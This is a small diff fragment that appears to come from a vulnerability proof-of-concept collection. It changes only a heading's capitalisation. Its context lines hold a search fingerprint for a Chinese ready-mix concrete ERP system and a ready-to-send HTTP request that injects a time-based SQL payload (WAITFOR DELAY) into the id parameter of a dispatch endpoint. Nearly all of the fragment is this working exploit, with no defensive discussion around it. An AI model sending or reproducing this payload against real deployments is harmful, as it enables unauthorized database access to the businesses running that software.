@@ -8,7 +8,7 @@
 title="商混ERP系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
